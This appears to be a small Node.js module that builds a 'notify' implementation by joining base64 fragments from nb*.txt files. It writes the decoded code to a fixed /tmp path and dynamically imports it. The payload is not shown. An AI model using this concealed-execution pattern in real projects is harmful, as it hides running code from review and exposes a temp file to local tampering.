import { writeFileSync, readFileSync } from 'node:fs';
import { pathToFileURL } from 'node:url';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const dir = dirname(fileURLToPath(import.meta.url));
const parts = [];
for (let i = 0; i < 30; i++) {
  try {
    parts.push(readFileSync(join(dir, `nb${i}.txt`), 'utf8').replace(/\s+/g, ''));
  } catch {
    break;
  }
}
if (!parts.length) throw new Error('notify base64 parts missing (nb0.txt…)');
const code = Buffer.from(parts.join(''), 'base64').toString('utf8');
const dest = '/tmp/leanlab_notify_impl.mjs';
writeFileSync(dest, code);
const mod = await import(pathToFileURL(dest).href);
export default mod.default;
